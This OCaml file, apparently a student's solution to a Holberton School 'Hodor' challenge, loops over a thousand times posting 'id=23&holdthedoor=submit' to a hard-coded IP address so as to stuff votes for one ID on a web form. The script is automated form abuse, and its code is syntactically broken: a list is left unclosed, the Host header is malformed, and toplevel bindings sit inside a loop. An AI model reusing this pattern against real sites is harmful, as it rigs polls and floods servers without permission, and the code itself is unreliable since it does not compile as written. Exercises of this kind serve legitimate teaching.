
(* ===----------------------------------------------------------------------------===
 *      Hodor Project Level 0, by Julien Barbier.
 *      Solution using Ocaml programming language.
 *
 *      by Alexandro de Oliveira, for Holberton School.
 * ===----------------------------------------------------------------------------===
 *)

open Http_client.Convenience;;

let post_para = [("(Request-Line)", "POST /level0.php HTTP/1.1");
         ("Host", "http://173.246.108.142");
         ("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
         ("Referer", "http://173.246.108.142/level0.php");
         ("Content-Length", "24");
         ("Pragma", "no-cache");
         ("Cache-Control", "no-cache");
         ("data", "id=23&holdthedoor=submit";;

for i = 0 to 1024 do
let post () = try (http_post "http://173.246.108.142/level0.php" post_para) with
    Http_client.Http_error (id, msg) -> msg;;

let _ = print_endline (post());;
done
